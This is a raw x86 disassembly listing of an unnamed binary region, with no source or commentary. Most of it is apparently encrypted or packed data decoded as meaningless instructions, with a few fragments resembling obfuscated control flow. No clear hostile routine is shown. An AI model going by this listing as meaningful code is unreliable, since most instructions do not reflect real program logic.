  40ce83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce84:	add    esi,DWORD PTR ds:0x2406dd30
  40ce8a:	(bad)  
  40ce8c:	and    eax,0xe97bbabb
  40ce91:	test   BYTE PTR [edx-0x38],cl
  40ce94:	pop    ds
  40ce95:	outs   dx,BYTE PTR ds:[esi]
  40ce96:	mov    eax,0x8ac555ce
  40ce9b:	jp     0x40ce8f
  40ce9d:	cdq    
  40ce9e:	xchg   ah,ch
  40cea0:	test   DWORD PTR [ebp+0x37e8e6bb],ebp
  40cea6:	and    DWORD PTR [esi],ebx
  40cea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cea9:	call   0x9473:0x7c6d6e06
  40ceb0:	sub    edi,DWORD PTR [edx+0x3df71d5a]
  40ceb6:	jmp    0x16ca:0xa132f080
  40cebd:	add    edx,edx
  40cebf:	sbb    eax,0xe74e6850
  40cec4:	add    cl,BYTE PTR [esp-0x56]
  40cec8:	loopne 0x40ce74
  40ceca:	and    eax,0x45b101e9
  40cecf:	sub    dl,BYTE PTR [esi-0x5cdc8649]
  40ced5:	cmp    BYTE PTR [ebx-0x45],bh
  40ced8:	ins    BYTE PTR es:[edi],dx
  40ced9:	dec    ebp
  40ceda:	fwait
  40cedb:	cmp    al,BYTE PTR [ebp+0x3f22ac25]
  40cee1:	(bad)  
  40cee2:	mov    edi,0x58e6ae2c
  40cee7:	sub    DWORD PTR [eax-0x59e94b94],edx
  40ceed:	not    DWORD PTR [eax]
  40ceef:	sub    al,0x46
  40cef1:	ret    
  40cef2:	test   al,0xcc
  40cef4:	adc    BYTE PTR [ecx-0x22],0x36
  40cef8:	cmp    dh,BYTE PTR [ecx]
  40cefa:	cli    
  40cefb:	pop    ebx
  40cefc:	aaa    
  40cefd:	pop    edi
  40cefe:	push   ebp
  40ceff:	outs   dx,BYTE PTR ds:[esi]
  40cf00:	push   cs
  40cf01:	and    esp,DWORD PTR [edi]
  40cf03:	push   esi
  40cf04:	call   0xfd9e8d70
  40cf09:	mov    ecx,DWORD PTR [bx+si-0x505]
  40cf0e:	cwde   
  40cf0f:	mov    eax,0x2fbc5728
  40cf14:	xor    BYTE PTR [eax-0x52],0x6d
  40cf18:	les    esi,FWORD PTR [edx]
  40cf1a:	cli    
  40cf1b:	ror    BYTE PTR [bx+si+0x1e],1
  40cf1f:	jmp    0x40cf8d
  40cf21:	dec    edx
  40cf22:	mov    dh,0x9c
  40cf24:	mov    ds:0x4149d164,eax
  40cf29:	ret    
  40cf2a:	adc    edi,ecx
  40cf2c:	push   edx
  40cf2d:	scas   al,BYTE PTR es:[edi]
  40cf2e:	sub    esi,DWORD PTR [esi-0x47259d7]
  40cf34:	and    DWORD PTR [eax],edi
  40cf36:	inc    esp
  40cf37:	dec    ebp
  40cf38:	jg     0x40cf14
  40cf3a:	mov    BYTE PTR [ebx],dh
  40cf3c:	jle    0x40cf50
  40cf3e:	mov    ch,BYTE PTR [ebx+0x43e0b2cb]
  40cf44:	pop    edx
  40cf45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf46:	dec    ebx
  40cf47:	or     BYTE PTR ds:0x58f176c7,dl
  40cf4d:	test   BYTE PTR [edi],al
  40cf4f:	xchg   ebp,eax
  40cf50:	inc    eax
  40cf51:	add    al,0x56
  40cf53:	inc    ebx
  40cf54:	ja     0x40cf45
  40cf56:	dec    esi
  40cf57:	loop   0x40cfd8
  40cf59:	enter  0x47a1,0xea
  40cf5d:	push   esi
  40cf5e:	dec    esp
  40cf5f:	dec    edi
  40cf60:	fbstp  TBYTE PTR [edx]
  40cf62:	push   eax
  40cf63:	in     eax,0xba
  40cf65:	fs fcmovb st,st(0)
  40cf68:	mov    ch,0xc0
  40cf6a:	xchg   dh,dh
  40cf6c:	mov    cl,0xe5
  40cf6e:	push   ebx
  40cf6f:	xchg   esp,eax
  40cf70:	jo     0x40cefe
  40cf72:	add    esi,DWORD PTR [eax]
  40cf74:	add    edx,eax
  40cf76:	retfw  0x110f
  40cf7a:	dec    edi
  40cf7b:	or     ebp,DWORD PTR [ebx+0x47bac77b]
  40cf81:	bound  ebp,QWORD PTR [ebx+0x6ff2d9e5]
  40cf87:	xchg   DWORD PTR ds:0x3708c96c,ebp
  40cf8d:	jb     0x40cf6f
  40cf8f:	add    DWORD PTR [ebx-0x52],edx
  40cf92:	inc    ecx
  40cf93:	lods   al,BYTE PTR ds:[esi]
  40cf94:	or     dl,dl
  40cf96:	out    dx,al
  40cf97:	push   eax
  40cf98:	inc    esi
  40cf99:	sub    eax,0x4ee36ce2
  40cf9e:	mov    ch,BYTE PTR [ebx-0x61]
  40cfa1:	sub    eax,0x4589c966
  40cfa6:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  40cfac:	add    eax,edx
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
  40cfc8:	pop    ecx
  40cfc9:	shr    BYTE PTR [ecx+0x7e894cce],cl
  40cfcf:	jle    0x40d010
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40cf5a
  40cfd5:	add    DWORD PTR [ebx-0x39],ecx
  40cfd8:	fwait
  40cfd9:	push   ecx
  40cfda:	js     0x40d056
  40cfdc:	cwde   
  40cfdd:	(bad)  
  40cfde:	hlt    
  40cfdf:	pop    edx
  40cfe0:	dec    ecx
  40cfe1:	mov    DWORD PTR [edi+0x26],esi
  40cfe4:	xchg   DWORD PTR [ecx+0xefcd8af],eax
  40cfea:	pop    ss
  40cfeb:	push   eax
  40cfec:	mov    ebp,0xa676c609
  40cff1:	arpl   sp,si
  40cff3:	ds ss shl sp,0x77
  40cff9:	inc    ebp
  40cffa:	sub    ch,BYTE PTR [eax-0xafc6046]
  40d000:	sbb    BYTE PTR [edx+0x44],0xb8
  40d004:	push   es
  40d005:	mov    ah,0x7b
  40d007:	fstp   QWORD PTR [ecx-0x44]
  40d00a:	pop    es
  40d00b:	sbb    edi,DWORD PTR [edi-0x3c]
  40d00e:	and    eax,0x2e8313a9
  40d013:	sbb    DWORD PTR [edx+0x70a40991],esi
  40d019:	or     edi,DWORD PTR es:[esi+0x11]
  40d01d:	cld    
  40d01e:	and    al,0x6e
  40d020:	mov    dh,0x76
  40d022:	sub    DWORD PTR [edi+0x1e],eax
  40d025:	jo     0x40d07a
  40d027:	sub    al,0xb1
  40d029:	sar    BYTE PTR [esi+edx*1-0x8801700],cl
  40d030:	loop   0x40d0a0
  40d032:	pop    edx
  40d033:	xchg   ebx,eax
  40d034:	repnz pop ds
  40d036:	and    DWORD PTR ds:0xd12e8d8d,esp
  40d03c:	mov    BYTE PTR [ecx+0xa],ah
  40d03f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d040:	cdq    
  40d041:	adc    bl,bl
  40d043:	pop    ds
  40d044:	pop    edx
  40d045:	xchg   ecx,eax
  40d046:	sub    DWORD PTR [ecx+0x63],0xffffffee
  40d04a:	pusha  
  40d04b:	mov    edi,0xe9c86050
  40d050:	dec    ebp
  40d051:	lock add dl,BYTE PTR [eax+0xf]
  40d055:	pushf  
  40d056:	push   ebx
  40d057:	add    al,BYTE PTR [esi+0x47]
  40d05a:	mov    ebx,0x3ce8ebc1
  40d05f:	dec    eax
  40d060:	jne    0x40d002
  40d062:	push   0x8c1edc4a
  40d067:	push   edx
  40d068:	stos   BYTE PTR es:[edi],al
  40d069:	jno    0x40d01b
  40d06b:	fisubr DWORD PTR es:[ebp+0x62]
  40d06f:	inc    ecx
  40d070:	adc    BYTE PTR [ecx+0x59],0xf3
  40d074:	adc    al,0xd6
  40d076:	or     al,0x36
  40d078:	mov    cl,0x4b
  40d07a:	push   ds
  40d07b:	pop    edx
  40d07c:	sbb    eax,DWORD PTR [edi-0xa]
  40d07f:	push   ss
  40d080:	shr    DWORD PTR [eax],0xc3
  40d083:	aaa    
  40d084:	fsubr  QWORD PTR [ecx+0x581faba1]
  40d08a:	js     0x40d07e
  40d08c:	mov    ebx,0x342cf713
  40d091:	out    dx,al
  40d092:	call   ecx
  40d094:	and    BYTE PTR [eax],ch
  40d096:	xchg   edx,eax
  40d097:	inc    esi
  40d098:	and    BYTE PTR [ebp+0x46],bh
  40d09b:	jge    0x40d045
  40d09d:	pop    ebp
  40d09e:	scas   eax,DWORD PTR es:[edi]
  40d09f:	aas    
  40d0a0:	xchg   BYTE PTR [edi+0x22ca6cfe],dh
  40d0a6:	inc    ebp
  40d0a7:	cmp    DWORD PTR [esi-0x49],ecx
  40d0aa:	adc    ebp,edi
  40d0ac:	stc    
  40d0ad:	jecxz  0x40d074
  40d0af:	outs   dx,BYTE PTR ds:[esi]
  40d0b0:	shl    DWORD PTR [ebx+0x2d],1
  40d0b3:	add    al,0xb3
  40d0b5:	pop    ds
  40d0b6:	push   ds
  40d0b7:	inc    edi
  40d0b8:	mov    DWORD PTR [ebp+0xb1fd2d8],edx
  40d0be:	call   0x37e5:0x3cfde0c
  40d0c5:	fsub   QWORD PTR [ecx*2+0x23f1eb0b]
  40d0cc:	icebp  
  40d0cd:	ret    
  40d0ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0cf:	pop    ds
  40d0d0:	mov    esi,0xcd010598
  40d0d5:	in     eax,dx
  40d0d6:	sbb    esp,DWORD PTR [esp+edx*4]
  40d0d9:	mul    BYTE PTR [esi]
  40d0db:	mov    eax,0x958dd5df
  40d0e0:	cmp    eax,ebx
  40d0e2:	test   eax,0x4ec43a94
  40d0e7:	sbb    al,0x8f
  40d0e9:	mov    ch,0xc8
  40d0eb:	and    esp,DWORD PTR [eax+0xb73deb7]
  40d0f1:	je     0x40d11c
  40d0f3:	add    esp,esp
  40d0f5:	stos   BYTE PTR es:[edi],al
  40d0f6:	pop    ebx
  40d0f7:	pop    ebx
  40d0f8:	aam    0x2e
  40d0fa:	dec    ebx
  40d0fb:	call   0x7e87e594
  40d100:	cli    
  40d101:	push   edi
  40d102:	and    ecx,DWORD PTR [esi+0x33cca3d2]
  40d108:	push   es
  40d109:	and    DWORD PTR [ebp+0x1ef6f97b],0x4374cf
  40d113:	lock inc ecx
  40d115:	xor    edx,ecx
  40d117:	mov    ecx,DWORD PTR [ebp+0x8]
  40d11a:	lea    ecx,[edx+ecx*1+0x32729d]
  40d121:	cmp    ecx,eax
  40d123:	je     0x40d712
  40d129:	mov    edi,DWORD PTR [ebp-0x18]
  40d12c:	mov    eax,DWORD PTR [ebp+0x8]
  40d12f:	mov    edx,DWORD PTR [ebp+0x14]
  40d132:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d136:	mov    ecx,0x7510856
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	adc    BYTE PTR ds:0xde1e15d,0x8b
  40d164:	jle    0x40d1e4
  40d166:	aas    
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d1d7
  40d16b:	loope  0x40d15e
  40d16d:	pop    ecx
  40d16e:	push   edi
  40d16f:	je     0x40d10a
  40d171:	movnti DWORD PTR [esi+ecx*8-0x32],ebx
  40d176:	rol    ah,1
  40d178:	aaa    
  40d179:	loope  0x40d1f0
  40d17b:	push   es
  40d17c:	(bad)  
  40d17e:	sub    bl,dl
  40d180:	dec    edx
  40d181:	xor    eax,eax
  40d183:	jne    0x40d121
  40d185:	cmp    ebx,ebx
  40d187:	push   0x1746c690
  40d18c:	bnd jge 0x40d11e
  40d18f:	pop    esi
  40d190:	lea    eax,[ebp+eiz*2+0x48]
  40d194:	sub    esi,edx
  40d196:	fiadd  DWORD PTR [ebx+edx*2]
  40d199:	into   
  40d19a:	scas   al,BYTE PTR es:[edi]
  40d19b:	sbb    DWORD PTR [ebx+0x57],ecx
  40d19e:	mov    ch,BYTE PTR [ecx]
  40d1a0:	pop    edx
  40d1a1:	test   al,0x64
  40d1a3:	pushf  
  40d1a4:	cwde   
  40d1a5:	sub    ch,BYTE PTR [edx]
  40d1a7:	cli    
  40d1a8:	xor    esp,DWORD PTR ds:0xf4af5fe0
  40d1ae:	fisttp QWORD PTR [esi]
  40d1b0:	lods   eax,DWORD PTR ds:[esi]
  40d1b1:	ds push ss
  40d1b3:	dec    ebx
  40d1b4:	jecxz  0x40d137
  40d1b6:	rol    BYTE PTR [edi-0x19],0xdb
  40d1ba:	add    DWORD PTR [edi+esi*8+0x37],0x215d5ea8
  40d1c2:	fnstsw WORD PTR ds:0xdc231771
  40d1c8:	pop    ds
  40d1c9:	sbb    al,ch
  40d1cb:	adc    ebx,ebp
  40d1cd:	adc    al,cl
  40d1cf:	push   es
  40d1d0:	stos   BYTE PTR es:[edi],al
  40d1d1:	sbb    bl,BYTE PTR ds:0xddeb981
  40d1d7:	sbb    esi,edi
  40d1d9:	lods   al,BYTE PTR ds:[esi]
  40d1da:	dec    ecx
  40d1db:	sbb    al,0xf4
  40d1dd:	cwde   
  40d1de:	in     eax,0x8e
  40d1e0:	sbb    eax,0x64f26f9e
  40d1e5:	or     al,0xf4
  40d1e7:	rol    al,cl
  40d1e9:	leave  
  40d1ea:	mov    ds:0xc30c889c,al
  40d1ef:	int    0x8e
  40d1f1:	rol    DWORD PTR [eax],cl
  40d1f3:	ror    DWORD PTR [esi],0x7c
  40d1f6:	or     DWORD PTR [eax+0x2a],ecx
  40d1f9:	add    eax,0x65ced97f
  40d1fe:	lock nop
  40d200:	mov    eax,0x7a916b45
  40d205:	jnp    0x40d1fc
  40d207:	test   BYTE PTR [ebx-0x3b],dl
  40d20a:	dec    eax
  40d20b:	push   0xffffffa5
  40d20d:	xlat   BYTE PTR ds:[ebx]
  40d20e:	or     eax,0xf452661e
  40d213:	sar    BYTE PTR [ecx+0x11d96307],1
  40d219:	iret   
  40d21a:	lock xchg edi,eax
  40d21c:	adc    bh,dl
  40d21e:	dec    edi
  40d21f:	ja     0x40d26f
  40d221:	adc    al,bh
  40d223:	xchg   BYTE PTR [edi+eiz*8-0x623ae174],dl
  40d22a:	adc    BYTE PTR [ebp+0x66],0x81
  40d22e:	stos   BYTE PTR es:[edi],al
  40d22f:	sub    DWORD PTR [edx+eax*4],eax
  40d232:	in     eax,0x8
  40d234:	jb     0x40d229
  40d236:	pushf  
  40d237:	sbb    cl,dh
  40d239:	mov    edx,0x7806423c
  40d23e:	std    
  40d23f:	or     eax,0x2dfaff2c
  40d244:	arpl   WORD PTR [ebp-0x5c5f9ce8],bp
  40d24a:	bnd jbe 0x40d253
  40d24d:	ret    0x1c0e
  40d250:	gs push edi
  40d252:	fnstenv [ebp+edi*8-0x29]
  40d256:	mov    DWORD PTR [edi],esp
  40d258:	js     0x40d2b1
  40d25a:	sub    al,0x30
  40d25c:	xor    ah,BYTE PTR [esi+0x676933ca]
  40d262:	std    
  40d263:	adc    ebp,DWORD PTR [edx-0x7276e5a9]
  40d269:	nop
  40d26a:	sbb    eax,0xddb218dd
  40d26f:	mov    cl,0x18
  40d271:	pop    eax
  40d272:	outs   dx,DWORD PTR ds:[esi]
  40d273:	imul   ecx,DWORD PTR [eax-0x57],0x10
  40d277:	lods   eax,DWORD PTR ds:[esi]
  40d278:	inc    ebp
  40d279:	xchg   esp,eax
  40d27a:	dec    ebp
  40d27b:	and    ch,BYTE PTR [esi-0x356d96c4]
  40d281:	les    esi,FWORD PTR [ecx]
  40d283:	adc    eax,0xe0a578b0
  40d288:	sub    BYTE PTR [esi-0x25],dh
  40d28b:	rol    DWORD PTR [edi+0x7c],0x63
  40d28f:	xor    eax,0x31a2a5e8
  40d294:	xor    dl,BYTE PTR [esi+0x20]
  40d297:	xor    al,0xd9
  40d299:	xor    bh,ch
  40d29b:	jecxz  0x40d30b
  40d29d:	push   ebx
  40d29e:	aad    0x4d
  40d2a0:	imul   ebp,ebx,0x3f
  40d2a3:	mov    dl,0xe6
  40d2a5:	daa    
  40d2a6:	mov    ah,cl
  40d2a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2a9:	cmp    DWORD PTR [ebx-0x62fd7b73],ebx
  40d2af:	jb     0x40d2e3
  40d2b1:	add    BYTE PTR [ebx+0x7d8b0855],cl
  40d2b7:	fmul   QWORD PTR [ecx+0x458b9704]
  40d2bd:	call   0x3349284d
  40d2c2:	ror    DWORD PTR [ebp+0x729d1084],0x32
  40d2c9:	add    BYTE PTR [ecx+0x458b0845],cl
  40d2cf:	call   0x422cbd
  40d2d4:	add    BYTE PTR [esi],ch
  40d2d6:	adc    al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	(bad)  [ebp-0xb]
  40d2e4:	iret   
  40d2e5:	into   
  40d2e6:	mov    WORD PTR [esi+0x7e],?
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d327
  40d2ee:	or     DWORD PTR [edi+0x135b59b7],0x5c446c6d
  40d2f8:	(bad)  
  40d2f9:	cli    
  40d2fa:	pop    ebx
  40d2fb:	aas    
  40d2fc:	gs call 0x70c2:0x1dc0ae2a
  40d304:	or     BYTE PTR [ebx-0x76],0xc4
  40d308:	aaa    
  40d309:	cmp    edx,DWORD PTR [ebx-0x43]
  40d30c:	pop    DWORD PTR [esi+ebp*8+0x6d832452]
  40d313:	cli    
  40d314:	lds    ebx,FWORD PTR [eax]
  40d316:	cmp    ebx,ecx
  40d318:	out    0xd1,al
  40d31a:	xchg   BYTE PTR [eax],ah
  40d31c:	aaa    
  40d31d:	cmp    BYTE PTR [edi+0xc6a41fa],bl
  40d323:	pushf  
  40d324:	jmp    0x2dfe:0x64aa6ad1
  40d32b:	out    0x3b,eax
  40d32d:	cmc    
  40d32e:	int3   
  40d32f:	and    al,al
  40d331:	faddp  st(2),st
  40d333:	into   
  40d334:	jmp    0x40d2ee
  40d336:	aad    0x11
  40d338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d339:	push   eax
  40d33a:	fild   QWORD PTR [edi]
  40d33c:	inc    edx
  40d33d:	or     BYTE PTR [edx-0x7795810c],dl
  40d343:	xchg   edx,eax
  40d344:	inc    eax
  40d345:	cmpxchg DWORD PTR ds:[ebx-0x74],esi
  40d34a:	push   esp
  40d34b:	fdiv   QWORD PTR [ebp+0x67]
  40d34e:	call   0xf4c2:0x34895603
  40d355:	push   ss
  40d356:	mov    edi,0xd81bb21c
  40d35b:	sub    bl,BYTE PTR [ebx+ebx*8+0x63f8c855]
  40d362:	ins    BYTE PTR es:[edi],dx
  40d363:	add    ah,BYTE PTR [esi]
  40d365:	jl     0x40d35e
  40d367:	cmp    BYTE PTR [ecx+0x245d77a],dh
  40d36d:	lds    ebp,FWORD PTR [esi-0x43a9e4f0]
  40d373:	push   esp
  40d374:	arpl   WORD PTR [ebx+edx*1-0xe],di
  40d378:	retf   
  40d379:	outs   dx,BYTE PTR ds:[esi]
  40d37a:	xchg   esp,eax
  40d37b:	sub    ah,al
  40d37d:	sahf   
  40d37e:	cmp    cl,BYTE PTR [ebx+esi*4+0x7737f161]
  40d385:	push   ebx
  40d386:	es in  al,dx
  40d388:	xchg   esi,eax
  40d389:	inc    ebx
  40d38a:	xor    ah,BYTE PTR [ecx]
  40d38c:	or     bl,BYTE PTR [edi-0x3f3334fa]
  40d392:	dec    ebx
  40d393:	dec    ebp
  40d394:	add    DWORD PTR [edx+eiz*4+0x3b],eax
  40d398:	mov    al,ds:0x2e805f98
  40d39d:	jno    0x40d3f7
  40d39f:	jmp    0x2f2b0df7
  40d3a4:	and    al,0xc6
  40d3a6:	sub    eax,0x7f147898
  40d3ab:	in     al,0xd0
  40d3ad:	inc    edx
  40d3ae:	xor    ah,BYTE PTR [ebx-0x3fe4cd86]
  40d3b4:	mov    ds:0x5e692b35,al
  40d3b9:	call   0x2d00:0x48e8a9ea
  40d3c0:	out    dx,al
  40d3c1:	and    al,BYTE PTR cs:[edx]
  40d3c4:	repnz fcom DWORD PTR [ebp-0x1b]
  40d3c8:	sub    DWORD PTR [edx-0xcc61302],edi
  40d3ce:	adc    esp,ebp
  40d3d0:	clc    
  40d3d1:	xlat   BYTE PTR ds:[ebx]
  40d3d2:	outs   dx,DWORD PTR ds:[esi]
  40d3d3:	ffreep st(7)
  40d3d5:	inc    ebx
  40d3d6:	sub    esp,edx
  40d3d8:	xchg   ecx,eax
  40d3d9:	pop    esi
  40d3da:	rcl    DWORD PTR [esi-0xa],cl
  40d3dd:	xchg   esi,eax
  40d3de:	mov    ds:0x9df03620,eax
  40d3e3:	adc    DWORD PTR [edi],esi
  40d3e5:	(bad)  
  40d3e6:	shl    DWORD PTR [eax],0x6f
  40d3e9:	test   eax,0x909df9fa
  40d3ee:	shl    dh,cl
  40d3f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3f1:	inc    ebp
  40d3f2:	loop   0x40d3a6
  40d3f4:	mov    edx,0x6a641b6e
  40d3f9:	add    bh,BYTE PTR ds:0xf6515e8b
  40d3ff:	aaa    
  40d400:	aaa    
  40d401:	aaa    
  40d402:	mov    eax,ds:0xa45092d8
  40d407:	mov    al,0x43
  40d409:	mov    al,ds:0xb464ef6a
  40d40e:	xchg   esi,eax
  40d40f:	mov    ecx,0x1fc1525b
  40d414:	mov    ebx,0x3f619ab8
  40d419:	mov    ebp,0x99682e81
  40d41e:	dec    esi
  40d41f:	dec    ecx
  40d420:	mov    eax,ecx
  40d422:	adc    al,0xce
  40d424:	sub    DWORD PTR [ecx-0x6269baca],ecx
  40d42a:	int    0x14
  40d42c:	mov    ah,0x7b
  40d42e:	mov    edx,DWORD PTR [ebp+0x14]
  40d431:	xor    eax,ecx
  40d433:	add    eax,esi
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	add    al,0x38
  40d44b:	in     eax,dx
  40d44c:	xor    cl,BYTE PTR [edi+0x3f7e7e8d]
  40d452:	jg     0x40d4d2
  40d454:	jle    0x40d4b8
  40d456:	add    ebx,ebx
  40d458:	loopne 0x40d47e
  40d45a:	ds mov esi,0x5dc0e85c
  40d460:	push   ss
  40d461:	cs call 0xd814ac6b
  40d467:	sbb    DWORD PTR [eax+edx*2+0x44c805f3],0xffffffee
  40d46f:	and    ecx,esi
  40d471:	inc    BYTE PTR [edi+edx*4+0x22]
  40d475:	arpl   WORD PTR [edi-0x5d19989c],bx
  40d47b:	fiadd  WORD PTR [edi+0x5c]
  40d47e:	imul   ebp,ebx,0x8e0ec28e
  40d484:	retf   
  40d485:	sahf   
  40d486:	imul   ecx,DWORD PTR [eax-0x1f3277d7],0xf7978d0e
  40d490:	fadd   QWORD PTR [edi+0x4b]
  40d493:	adc    DWORD PTR [ebx-0x4ab4f4bb],0xc3718de9
  40d49d:	xchg   ebp,eax
  40d49e:	test   eax,0xe5681d33
  40d4a3:	ficomp DWORD PTR [esi]
  40d4a5:	test   BYTE PTR [edx+0x11],bh
  40d4a8:	and    esi,esp
  40d4aa:	les    edx,FWORD PTR [edi]
  40d4ac:	sub    eax,0xff4efa8c
  40d4b1:	mov    cl,0xf2
  40d4b3:	xchg   edx,eax
  40d4b4:	mov    dh,0x6f
  40d4b6:	push   0xfffffff7
  40d4b8:	jmp    0xd183:0xf6449ce4
  40d4bf:	mov    esi,0x6a0003f3
  40d4c4:	xor    eax,0xae067d1b
  40d4c9:	test   eax,0x4ab22904
  40d4ce:	mov    esp,0x62d87f8b
  40d4d3:	call   0xabeff418
  40d4d8:	imul   ebp,DWORD PTR [eax+esi*8-0x15],0x4c
  40d4dd:	(bad)  [ecx]
  40d4df:	in     al,dx
  40d4e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4e1:	arpl   di,cx
  40d4e3:	sub    cl,ah
  40d4e5:	mov    bh,0x75
  40d4e7:	repz jge 0x40d532
  40d4ea:	adc    eax,0x3b87995d
  40d4ef:	mov    bl,0x7c
  40d4f1:	je     0x40d48e
  40d4f3:	jle    0x40d51a
  40d4f5:	aaa    
  40d4f6:	pop    ds
  40d4f7:	mov    ebx,0xf5bce9bc
  40d4fc:	sub    al,bl
  40d4fe:	lock fimul WORD PTR [ebp-0x7e2bb5b3]
  40d505:	mov    dl,0xf5
  40d507:	xor    BYTE PTR [ecx],0x6b
  40d50a:	add    dh,dl
  40d50c:	fadd   DWORD PTR [ebx+edx*2+0x36450ffa]
  40d513:	xor    eax,ecx
  40d515:	xor    eax,0x1af6bb8a
  40d51a:	enterw 0xa118,0xcf
  40d51f:	adc    DWORD PTR [edi+0x35],esi
  40d522:	mov    al,ds:0xe339ffa
  40d527:	cmp    DWORD PTR [edx-0x6042c294],0xffffffb2
  40d52e:	data16 sahf 
  40d530:	icebp  
  40d531:	and    edi,edi
  40d533:	mov    al,cl
  40d535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d536:	lods   al,BYTE PTR ds:[esi]
  40d537:	inc    ecx
  40d538:	jae    0x40d4f0
  40d53a:	hlt    
  40d53b:	aas    
  40d53c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d53d:	xor    BYTE PTR [ecx-0x56],al
  40d540:	lods   al,BYTE PTR ds:[esi]
  40d541:	cmp    DWORD PTR ds:0x37e7b2d,esp
  40d547:	inc    eax
  40d548:	cmp    esp,edx
  40d54a:	iret   
  40d54b:	ficom  DWORD PTR [esi*4-0x37f9e892]
  40d552:	push   ecx
  40d553:	pop    es
  40d554:	jno    0x40d574
  40d556:	sub    al,0xcb
  40d558:	mov    bh,0xec
  40d55a:	stc    
  40d55b:	test   eax,0x7b760d8c
  40d560:	(bad)  
  40d561:	and    dh,BYTE PTR [ebx-0x6b5b94bf]
  40d567:	add    BYTE PTR [ebx+0x2c],bh
  40d56a:	pop    ecx
  40d56b:	ficomp DWORD PTR [edi+0x38896731]
  40d571:	mov    ebx,0xbd3f4b0c
  40d576:	ins    DWORD PTR es:[edi],dx
  40d577:	xchg   ebx,eax
  40d578:	sbb    eax,0xab2d088c
  40d57d:	sbb    eax,0xb3ae7ce5
  40d582:	or     al,0x95
  40d584:	and    ah,BYTE PTR [eax-0x500ae285]
  40d58a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d58b:	mov    al,0x83
  40d58d:	outs   dx,DWORD PTR ds:[esi]
  40d58e:	dec    ecx
  40d58f:	sbb    al,0xbd
  40d591:	and    ebp,DWORD PTR [ebp-0x5f]
  40d594:	and    cl,BYTE PTR [eax-0x1603aa75]
  40d59a:	pop    ecx
  40d59b:	add    DWORD PTR [eax],eax
  40d59d:	add    bh,ah
  40d59f:	idiv   DWORD PTR [edx]
  40d5a1:	push   ss
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0xc92bfe4c
  40d5ac:	std    
  40d5ad:	jae    0x40d5ef
  40d5af:	mov    ?,WORD PTR [esi+0x7e]
  40d5b2:	aas    
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d5d0
  40d5b7:	inc    esp
  40d5b8:	fbstp  TBYTE PTR [edx-0x13]
  40d5bb:	lods   eax,DWORD PTR ds:[esi]
  40d5bc:	push   esi
  40d5bd:	das    
  40d5be:	jl     0x40d5b1
  40d5c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5c1:	sbb    al,0x37
  40d5c3:	mov    DWORD PTR [edx+0x78],ebp
  40d5c6:	addr16 jge 0x40d593
  40d5c9:	in     al,0xe1
  40d5cb:	cmc    
  40d5cc:	das    
  40d5cd:	pop    ss
  40d5ce:	mov    ebp,0x11d63ad2
  40d5d3:	or     ch,bh
  40d5d5:	push   ds
  40d5d6:	xchg   edi,eax
  40d5d7:	dec    edi
  40d5d8:	not    BYTE PTR [esp+ecx*4-0x20]
  40d5dc:	xor    al,0x6b
  40d5de:	xor    BYTE PTR [esi],ch
  40d5e0:	lds    edx,FWORD PTR [eax+eiz*4+0x196c28ca]
  40d5e7:	shr    BYTE PTR [ecx+0x29],1
  40d5ea:	push   ecx
  40d5eb:	pop    ss
  40d5ec:	push   ecx
  40d5ed:	lock add al,0x3d
  40d5f0:	inc    eax
  40d5f1:	or     DWORD PTR [esp+edx*8+0x7],edi
  40d5f5:	test   DWORD PTR ds:0x112fe9a2,0xae9301d8
  40d5ff:	(bad)  
  40d600:	shl    DWORD PTR [esi],1
  40d602:	test   esi,ebp
  40d604:	nop
  40d605:	inc    esi
  40d606:	mov    eax,0x7f38f7a0
  40d60c:	push   ds
  40d60d:	out    dx,al
  40d60e:	leave  
  40d60f:	sub    al,0xfe
  40d611:	push   ecx
  40d612:	push   edx
  40d613:	es scas al,BYTE PTR es:[edi]
  40d615:	sbb    edi,eax
  40d617:	ffreep st(1)
  40d619:	mov    esp,0x1c2b13ec
  40d61e:	inc    edi
  40d61f:	(bad)  
  40d620:	jge    0x40d5b1
